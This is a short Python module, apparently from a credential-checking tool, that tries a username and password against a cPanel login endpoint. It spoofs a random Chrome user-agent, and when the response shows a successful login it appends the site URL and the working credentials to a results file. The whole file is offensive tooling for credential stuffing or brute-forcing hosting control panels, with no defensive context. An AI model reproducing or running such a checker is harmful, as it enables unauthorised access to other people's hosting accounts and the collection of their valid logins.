import requests
from files.localuseragent import *
from tool._print import print_centos, bad_site

def main(url,username,password):
    try:
        headers = {
        "User-agent": random.choice(ua["browsers"]["chrome"]),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-type': 'application/x-www-form-urlencoded',
        'Origin': url,
        'Connection': 'keep-alive',
        'Referer': f'{url}/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
        data = {
            'user': username,
            'pass': password,
            'goto_uri': '/',
        }
        
        req = requests.post(url+"?login_only=1",data=data,timeout=10,headers=headers)
        if '"status":1,' in req.content:
            with open('result/Cpanel.txt', 'a') as xw:
                xw.write(url+"\n"+"="*30+"\n{}\n{}".format(username,password))
                return print_centos(site=url, cms="cpanel")
    except:
        return bad_site(site=url, cms="cpanel")